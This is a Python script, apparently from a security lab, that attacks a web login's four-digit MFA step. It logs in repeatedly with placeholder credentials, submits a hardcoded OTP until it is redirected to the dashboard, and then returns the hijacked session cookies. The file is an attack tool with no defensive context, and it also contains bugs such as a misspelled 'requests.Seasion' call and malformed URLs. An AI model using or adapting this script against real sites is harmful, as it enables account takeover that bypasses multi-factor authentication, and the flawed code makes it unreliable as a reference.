import requests


login_url="http://example.com"
otp_url="http://example/mfa"
dashboard_url="http://example/dashboard"
hard_coded_opt="3333"

credentials={
    "username":"username123",
    "password":"text1234"
}



headers={
    'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://example.com',
    'Connection': 'close',
    'Referer': 'http://example.com/mfa',
    'Upgrade-Insecure-Requests': '1'
}


# Function for checking if log in has succeeded
def is_loggedin_success(response):
    return "User verification" in response.text and response.status_code==200

# This function handles log in
def handle_login(session):
    response= session.post(login_url, data=credentials, headers=headers)
    return response


# Function for handling mfa
def test_otp(session, otp):
    otp_code={
        "code-1": otp[0],
        "code-2": otp[1],
        "code-3": otp[2],
        "code-4":otp[3]
    }
    response = session.post(otp_url, data=otp_code, headers=headers, allow_redirects=False)
    print("OTP response code recieved", {response.status_code})

    return response



# If we got redirected to the log in page due to to security mechanisim

def check_login(response):
    return "Sign in to your account" in response.text or "Log in" in response.text




# Brute forcing logging in

def brute_force():
    while True:

        session= requests.Seasion()
        login_response= handle_login(session)

        if is_loggedin_success(login_response):
            print("logged in ")
        else:
            continue

        response=test_otp(session, hard_coded_opt)

        if check_login(response):
            print("Unsuccessful try, we got redirected to log in page")
            continue


        if response.status_code == 302:
            current_location=response.headers.get('Location','')
            
            if current_location == "/dashboard":
                print("Successfully bypassed OTP with: ", hard_coded_opt)
                return session.cookies.get_dict()
            elif current_location =="/":
                print("Unseccessful attempt, redirected to log in page")
            else:
                print("unknown header location: ", current_location , "OTP: ", hard_coded_opt)
        else:
            print("Recieved status code: ", response.status_code)

